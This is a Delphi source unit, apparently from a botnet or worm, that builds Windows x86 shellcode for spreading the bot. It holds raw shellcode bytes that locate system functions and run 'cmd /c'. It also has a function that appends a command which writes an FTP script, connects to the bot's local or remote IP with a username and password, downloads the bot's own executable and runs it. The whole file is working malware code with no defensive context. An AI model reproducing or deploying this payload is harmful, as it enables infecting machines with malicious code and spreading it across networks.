unit shellcode;

interface

Function FTP_Shellcode(Local:Boolean):String;

implementation

uses
  SysUtils,Ftp,config;

Const
    Base = #$eb#$61#$5e#$33#$c0#$b0#$fe#$04#$30#$33#$c9#$51#$51#$8d#$46#$04#$50#$56#$6a#$30#$59#$64#$8b#$01#$8b#$40#$0c#$8b#$70#$1c#$ad#$8b#$58#$08#$8b#$43#$3c#$8b#$44#$18#$78#$8d#$74#$18#$1c#$b1#$03#$ad#$03#$c3#$50#$e2#$fa#$5d#$5f#$8b#$34#$8f#$03#$f3#$33#$c0#$99#$ac#$03#$d0#$c1#$c2#$05#$48#$79#$f7#$41#$8b#$44#$24#$04#$66#$3b#$10#$75#$e5#$58#$0f#$b7#$54#$4d#$fe#$03#$1c#$90#$5e#$ff#$d3#$66#$ad#$eb#$af#$e8#$9a#$ff#$ff#$ff#$64#$66#$bb#$a6#$63#$6d#$64#$20#$2f#$63#$20#$ff;  // LIMITED TO 255 Bytes

Function FTP_Shellcode;
var
  FTP,Command:String;
  fm:string[9]; // max file length 9 bytes
begin
  Randomize;
  fm:='~'+inttostr(random(1000))+'.dat';
  Ftp:=Base;
  If Local then
    Command:='echo open '+Data.BOT_LocalIP+#32+inttostr(port)+#32#62+fm+'&&echo user '+user+' '+pass+'>>'+fm+'&&echo binary >>'+fm+'&&echo get '+Extractfilename(paramstr(0))+'>>'+fm+'&&echo quit>>'+fm+'&&ftp.exe -n -s:'+fm+'&&'+Extractfilename(paramstr(0))       // 177 block
  else
    Command:='echo open '+Data.BOT_RemoteIP+#32+inttostr(port)+#32#62+fm+'&&echo user '+user+' '+pass+'>>'+fm+'&&echo binary >>'+fm+'&&echo get '+Extractfilename(paramstr(0))+'>>'+fm+'&&echo quit>>'+fm+'&&ftp.exe -n -s:'+fm+'&&'+Extractfilename(paramstr(0));       // 177 block
  Insert(chr(11 + length(command)),ftp,7);
  Insert(command,ftp,length(ftp));
  Result:=ftp;
end;
end.
 